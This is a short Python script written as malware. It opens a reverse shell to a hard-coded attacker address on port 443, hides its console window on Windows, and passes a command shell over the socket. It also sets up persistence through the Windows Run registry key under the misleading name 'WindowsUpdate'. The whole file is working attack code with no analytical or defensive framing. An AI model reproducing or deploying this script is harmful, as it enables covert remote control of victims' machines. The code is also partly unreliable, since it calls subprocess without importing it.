import socket
import os
import sys
import ctypes  # Windows only

ATTACKER_IP = "192.168.1.77"
PORT = 443

def reverse_shell():
    try:
        s = socket.socket()
        s.connect((ATTACKER_IP, PORT))
        
        # Windows specific
        if sys.platform == "win32":
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)  # Hide window
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(["cmd.exe", "/k", "echo SHELL ACTIVE"])
        else:  # Linux/Mac
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(["/bin/sh", "-i"])
            
        # Keep connection alive
        while True:
            data = s.recv(1024)
            if not data:
                break
    except:
        pass

# Persistence (Windows)
if sys.platform == "win32":
    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])

reverse_shell()
